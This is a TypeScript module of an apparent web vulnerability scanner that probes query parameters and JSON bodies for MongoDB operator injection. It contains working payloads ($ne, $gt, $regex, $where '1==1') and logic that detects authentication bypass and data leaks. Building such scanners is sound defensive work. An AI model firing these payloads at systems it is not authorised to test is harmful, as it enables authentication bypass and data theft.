/**
 * Scanner: NoSQL injection tester
 *
 * Tests for MongoDB operator injection ($gt, $ne, $regex, $where)
 * in query parameters and JSON request bodies.
 */

import { httpRequest } from "../http-client"

export interface NoSqlResult {
  vulnerable: boolean
  findings: NoSqlFinding[]
  testedCount: number
}

export interface NoSqlFinding {
  parameter: string
  position: "query" | "body"
  payload: string
  evidence: string
  technique: string
}

// NoSQL operator payloads for query params (URL-encoded)
const QUERY_PAYLOADS: { payload: Record<string, string>; technique: string }[] = [
  { payload: { "[$ne]": "" }, technique: "not-equal bypass" },
  { payload: { "[$gt]": "" }, technique: "greater-than bypass" },
  { payload: { "[$regex]": ".*" }, technique: "regex bypass" },
  { payload: { "[$exists]": "true" }, technique: "exists operator" },
  { payload: { "[$in][]": "admin" }, technique: "in-array bypass" },
]

// NoSQL payloads for JSON body injection
const JSON_PAYLOADS: { payload: unknown; technique: string }[] = [
  { payload: { "$ne": "" }, technique: "not-equal operator" },
  { payload: { "$gt": "" }, technique: "greater-than operator" },
  { payload: { "$regex": ".*" }, technique: "regex operator" },
  { payload: { "$ne": null }, technique: "not-null operator" },
  { payload: { "$exists": true }, technique: "exists operator" },
  { payload: { "$where": "1==1" }, technique: "$where injection" },
]

// Indicators that suggest successful NoSQL injection
const SUCCESS_INDICATORS = [
  // Response suggests authentication bypass or data leak
  "token", "access_token", "jwt", "session", "logged in", "welcome",
  "dashboard", "profile", "admin",
]

const ERROR_INDICATORS = [
  // MongoDB/NoSQL error messages
  "mongoerror", "mongo", "bson", "operator", "castError",
  "invalid operator", "$where", "aggregate", "query",
]

/**
 * Test a single parameter for NoSQL injection via query string.
 */
async function testQueryParam(
  url: string,
  parameter: string,
  baselineStatus: number,
  baselineLength: number,
  timeout: number,
): Promise<NoSqlFinding[]> {
  const findings: NoSqlFinding[] = []

  for (const { payload, technique } of QUERY_PAYLOADS) {
    const u = new URL(url)
    // Remove original param and add operator variant
    u.searchParams.delete(parameter)
    for (const [suffix, value] of Object.entries(payload)) {
      u.searchParams.set(`${parameter}${suffix}`, value)
    }

    const resp = await httpRequest(u.href, { timeout })

    // Check for authentication bypass (status changed from 401/403 to 200)
    if ((baselineStatus === 401 || baselineStatus === 403) && resp.status === 200) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `Status changed from ${baselineStatus} to ${resp.status} — likely auth bypass`,
        technique,
      })
      continue
    }

    // Check for significant length difference (data leak)
    if (resp.status === 200 && Math.abs(resp.body.length - baselineLength) > baselineLength * 0.5) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `Response length changed significantly: ${baselineLength} → ${resp.body.length}`,
        technique,
      })
      continue
    }

    // Check for success indicators
    const lower = resp.body.toLowerCase()
    for (const indicator of SUCCESS_INDICATORS) {
      if (lower.includes(indicator) && !lower.includes("error")) {
        findings.push({
          parameter,
          position: "query",
          payload: u.searchParams.toString(),
          evidence: `Found indicator "${indicator}" in response`,
          technique,
        })
        break
      }
    }

    // Check for error-based information leakage
    for (const indicator of ERROR_INDICATORS) {
      if (lower.includes(indicator)) {
        findings.push({
          parameter,
          position: "query",
          payload: u.searchParams.toString(),
          evidence: `NoSQL error indicator "${indicator}" in response`,
          technique: `error-based: ${technique}`,
        })
        break
      }
    }
  }

  return findings
}

/**
 * Test a parameter for NoSQL injection via JSON body.
 */
async function testJsonBody(
  url: string,
  parameter: string,
  baseBody: Record<string, unknown>,
  baselineStatus: number,
  baselineLength: number,
  timeout: number,
): Promise<NoSqlFinding[]> {
  const findings: NoSqlFinding[] = []

  for (const { payload, technique } of JSON_PAYLOADS) {
    const body = { ...baseBody, [parameter]: payload }
    const resp = await httpRequest(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      timeout,
    })

    // Auth bypass check
    if ((baselineStatus === 401 || baselineStatus === 403) && resp.status === 200) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `Status changed from ${baselineStatus} to ${resp.status} — likely auth bypass`,
        technique,
      })
      continue
    }

    // Length difference
    if (resp.status === 200 && Math.abs(resp.body.length - baselineLength) > baselineLength * 0.3) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `Response length: ${baselineLength} → ${resp.body.length}`,
        technique,
      })
    }

    // Error indicators
    const lower = resp.body.toLowerCase()
    for (const indicator of ERROR_INDICATORS) {
      if (lower.includes(indicator)) {
        findings.push({
          parameter,
          position: "body",
          payload: JSON.stringify(payload),
          evidence: `NoSQL error: "${indicator}" in response`,
          technique: `error-based: ${technique}`,
        })
        break
      }
    }
  }

  return findings
}

/**
 * Test URL parameters and JSON body for NoSQL injection.
 */
export async function testNoSql(
  url: string,
  options: {
    parameters?: string[]
    jsonBody?: Record<string, unknown>
    timeout?: number
  } = {},
): Promise<NoSqlResult> {
  const { parameters, jsonBody, timeout = 10_000 } = options
  let testedCount = 0
  const allFindings: NoSqlFinding[] = []

  // Baseline request
  const baselineResp = await httpRequest(url, { timeout })
  const baselineStatus = baselineResp.status
  const baselineLength = baselineResp.body.length

  // Test query parameters
  const parsedUrl = new URL(url)
  const queryParams = parameters ?? [...parsedUrl.searchParams.keys()]

  for (const param of queryParams) {
    testedCount += QUERY_PAYLOADS.length
    const findings = await testQueryParam(url, param, baselineStatus, baselineLength, timeout)
    allFindings.push(...findings)
  }

  // Test JSON body
  if (jsonBody) {
    for (const param of Object.keys(jsonBody)) {
      testedCount += JSON_PAYLOADS.length
      const findings = await testJsonBody(url, param, jsonBody, baselineStatus, baselineLength, timeout)
      allFindings.push(...findings)
    }
  }

  return {
    vulnerable: allFindings.length > 0,
    findings: allFindings,
    testedCount,
  }
}
